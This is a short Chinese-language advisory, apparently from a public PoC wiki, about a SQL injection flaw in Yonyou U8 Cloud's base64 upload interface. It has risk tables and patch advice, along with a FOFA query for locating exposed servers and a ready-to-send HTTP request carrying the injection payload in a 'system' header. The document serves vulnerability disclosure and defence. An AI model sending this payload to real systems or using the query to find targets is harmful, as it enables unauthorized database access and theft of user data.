---
fofa: "app="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 关于用友U8 Cloud base64 SQL注入漏洞预警

# 漏洞描述

用友U8 Cloud base64接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。

# 影响范围

用友U8 Cloud

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="用友-U8-Cloud"

POC/EXP：

GET /u8cloud/api/file/upload/base64 HTTP/1.1
Host: 127.0.0.1:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
system: -1' or 1=@@version--+

![image-20240314111329425](./.resource/用友U8Cloudbase64SQL注入/media/image-20240314111329425.png)


# 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

目前软件已发布安全修复更新，受影响用户可以联系厂商获取补丁。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
